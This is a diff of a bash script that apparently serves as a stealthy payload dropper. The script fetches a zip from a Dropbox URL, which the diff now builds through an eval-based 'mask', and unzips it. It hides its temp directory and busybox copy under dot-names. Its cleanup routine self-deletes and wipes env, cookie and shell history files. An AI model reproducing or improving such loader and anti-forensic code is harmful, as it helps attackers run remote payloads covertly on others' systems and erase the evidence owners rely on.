@@ -2,7 +2,9 @@
 ## needed tmux sed grep envsubst
 
 ## load customization variables
-[ -f env.sh ] && . ./env.sh
+[ -f env.sh ] && . ./env.sh && STARTING_VARS=$(<env.sh)
+STARTING_PATH=$PATH
+STARTING_PID=$BASHPID
 
 pathx() {
     cd ${1}
@@ -13,7 +15,7 @@ pathx() {
 }
 
 tmppath() {
-    if tmppath=$($bb mktemp -d) && pathx $tmppath; then
+    if tmppath=$($bb mktemp -d -t .XXXXXXXX) && pathx $tmppath; then
         export PATH=${tmppath}:${PATH} tmppath
     else
         for ph in {/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; do
@@ -44,10 +46,13 @@ jailjudge
 
 getpayload(){
     ## get payload from dbx
-    token=${pl_token:-lxizr6cg4liekm1}
-    name=${pl_name:-payload.zip}
-    wget -q https://dl.dropboxusercontent.com/s/$token/$name
-    unzip $name && rm $name || return 1
+    mask=${pl_mask:-:ep/:token/:name}
+    ep=${pl_ep:-https://dl.dropboxusercontent.com/s}
+    token=${pl_token:-xxxxxxxxxxxxxxx}
+    name=${pl_name:-payload-latest.zip}
+    uri=$(eval "echo ${mask//:/$}")
+    wget -q $uri
+    unzip -q $name && rm $name || return 1
     # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
     # cd scripts-${BRANCH} || exit 1
 }
@@ -60,7 +65,8 @@ getpayload || exit 1
 
 ## env vars and busybox
 export PATH=.:pl:$PATH
-cp $(get_path busybox) $tmppath/../ && chmod +x $tmppath/../busybox
+bb=.bb
+cp $(get_path busybox) "$tmppath/../$bb" && chmod +x "$tmppath/../$bb"
 
 ## choose masks
 . ./masks || exit 1
@@ -99,12 +105,10 @@ cd ..
 
 ## removing tmppath too early might be a race cond
 cleanup() {
-    rm -rf -- "$0" \
-       "$tmppath" \
-       "scripts-${BRANCH}" \
-       "$HOME"/.*_history \
-       ~/.*_history \
-       /.*_history
+    rm -rf "$tmppath" "scripts-${BRANCH}" \
+       -- "$0" \
+       "dig" "cookie" "env.sh" "../env.sh" \
+       "$HOME"/.*_history ~/.*_history /.*_history
     # [ -n "$tmppath" ] && find ${tmppath}/${dir} \
     #                           ! -name "$OBJ_MASK" \
     #                           ! -name "$OBJ_CFG_MASK" \
